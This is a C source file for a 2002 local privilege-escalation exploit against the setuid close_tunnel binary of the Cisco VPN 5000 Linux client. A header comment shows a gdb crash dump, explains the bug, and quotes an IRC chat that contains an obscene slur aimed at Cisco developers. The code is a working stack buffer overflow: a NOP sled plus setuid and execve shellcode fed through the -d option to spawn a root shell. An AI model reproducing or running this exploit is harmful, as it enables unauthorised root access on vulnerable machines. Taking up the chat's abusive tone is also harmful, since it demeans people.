/*
* [ElectronicSouls] Local Root Exploit for Cisco VPN 5000 Client
* (C) BrainStorm - 2002
*
* Program received signal SIGSEGV, Segmentation fault.
* 0x41414141 in ?? ()
* (gdb) i r
* eax            0xffffffff       -1
* ecx            0x0      0
* edx            0x0      0
* ebx            0x4015c154       1075167572
* esp            0xbfffdb70       0xbfffdb70
* ebp            0x41414141       0x41414141
* esi            0x400168e4       1073834212
* edi            0xbfffdbf4       -1073751052
* eip            0x41414141       0x41414141
* eflags         0x10286  66182
*
* as you can see %eip got filled with 0x41 ;)
*
* tested:
*         - on release 5.1.5
*         - from package: vpn-5000-linux-5.1.5-des-k8.tar.Z
*         - system RedHat Linux 7.2 / x86
*
* Bug Information:
*  There are multiple unchecked buffers in the code which allow
*  arbitrary code to be executed with root privileges.
*  this is due to insufficient bounds checking.
*  the result is a classic command line buffer overflow condition.
*  This should be exploitable on Linux/Solaris.
*
* IRC:
*  <BrainStor> a standard cmd line buffer overflow in the -d option
*  <BrainStor> close_tunnel is set +s by default
*  <v0id> tsk tsk tsk, cisco making errors like that
*  <v0id> fucking stupid cunts
*  <BrainStor> yea
*  <BrainStor> its ubeliveable
*  <v0id> man, standard buffer overflow should be practiclly non existant 
these days
*  <v0id> oh well
*  <BrainStor> indeed
*  <BrainStor> but its good tho ;)
*/

#include <stdio.h>
#include <unistd.h>

#define B       2504
#define N       0x90
#define R       0xbfffefc0                                                // 
may needs to be changed deppending on the distro/os..
#define BIN     "/bin/close_tunnel"                                       // 
you maybe want to change this too =P
                                                                          // 
/usr/local/bin/close_tunnel or so..
char shell[] = "HELO"                                                     // 
yes this is a valid x86 instruction ;)
               "\x31\xdb\x89\xd8\xb0\x17\xcd\x80"                         // 
setuid();
               "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c"
               "\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb"
               "\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";


int main(int argc, char **argv[])
{
  int ret, off, es;

  char bof[B];

    printf("\n\n");
    printf("       [ElectronicSouls]       \n");
    printf(" Cisco VPN 5000 client exploit \n");
    printf("        (C) BrainStorm       \n\n");

    if(argv[1] == NULL) {
       off = 0;
       ret = R; }

    else {
       off = atoi(argv[1]);
       ret = atoi(argv[2])+off; }

    for (es = 0; es < B; es += 4 )
       *(long *) &bof[es] = ret;

    printf("+ return address: 0x%lx \n",ret);

    for (es = 0; es < (B - strlen(shell) - 36); ++es)
       *(bof+es) = N;

    memcpy(bof+es, shell, strlen(shell));

    printf("+ overflowing the buffer..\n\n\n");

    execl(BIN,BIN,"-d",bof,0);       // b00m!

  return(0);
}


